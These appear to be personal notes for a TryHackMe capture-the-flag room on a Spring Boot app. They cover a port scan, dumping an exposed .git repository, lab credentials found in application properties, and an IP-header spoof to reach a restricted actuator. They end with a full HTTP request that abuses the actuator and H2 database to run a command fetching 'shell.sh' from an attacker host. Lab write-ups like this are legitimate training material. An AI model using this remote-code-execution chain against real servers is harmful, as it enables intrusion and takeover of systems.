`nmap -sVC -T4 -p- 10.10.197.190`
![](attachment/dd21494c789ea7f67049471168063f32.png)
![](attachment/bd861fd80df1764cbed29f8a04ac4da0.png)
![](attachment/ff63ca7a5a002b41f3b4d326bee4e6ba.png)
![](attachment/e47e3a0e7a9f04bf3ffa4efffcc20442.png)
https://github.com/internetwache/GitTools
You can use this tool to find websites with their .git repository available to the public
`./gitdumper.sh https://10.10.197.190/sources/new/.git/ /home/yousef/tryhackme/Spring/`
![](attachment/495180e777c11577ec05b0179ff112c2.png)
![](attachment/f9078074d0171e3627aefeb38138cc09.png)
![](attachment/cab1134f3b266c18e228ed04978d8687.png)
The ==git reset== command is used to undo the changes in your working directory and get back to a specific commit while discarding all the commits made after that one. For instance, imagine you made ten commits. Using git reset on the first commit will remove all nine commits, taking you back to the first commit stage.
![](attachment/a028d97f0e38f2445deffdbf679f976b.png)
some files did appear!
![](attachment/1b64869d8a5fd43659519b04792d2cc3.png)
I think it's a java application
got to the java code in the main
![](attachment/f209449219f6eba31e395f96ef841e07.png)
![](attachment/1eb1bff4e7f331b4a47826f0ef05df89.png)
```Java
    @RestController
    //https://spring.io/guides/gs/rest-service/
    static class HelloWorldController {
        @RequestMapping("/")
        public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
            System.out.println(name);
            return String.format("Hello, %s!", name);
        }
    }
```
I think it accepting ?name parameter
![](attachment/f207439a332364f484befd85dc937ba9.png)
It is accepting parameters 
it is using tomcat server
![](attachment/300bbdb35b68ed0debfb41eacf604c48.png)
has acutator endpoint can only access from ==172.16.0.0== ip
![](attachment/d6a9379c80fe817ae6651788fd6a6cc5.png)
https://www.baeldung.com/spring-boot-actuators
https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/
Found creds on application.proberites 
![](attachment/e0a78630d4048d4f1255dcb18bfe0233.png)
```
server.ssl.key-store-password=DummyKeystorePassword123.
spring.security.user.name=johnsmith
spring.security.user.password=PrettyS3cureSpringPassword123.
```
but no lucky trying to ssh
![](attachment/babaf8bdc85a11d20aa5fe1583f5c614.png)
but this header
```
server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04
```
when access the actutator endpoint we get 403
![](attachment/c1bed25fd4c40292f3a2eff1636635ce.png)
but adding ==x-9ad42dea0356cb04: 127.16.0.2== to the request:


```
POST /actuator/env HTTP/1.1
Host: target.app
Content-Type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('wget http://10.9.4.217/shell.sh');');"}
```
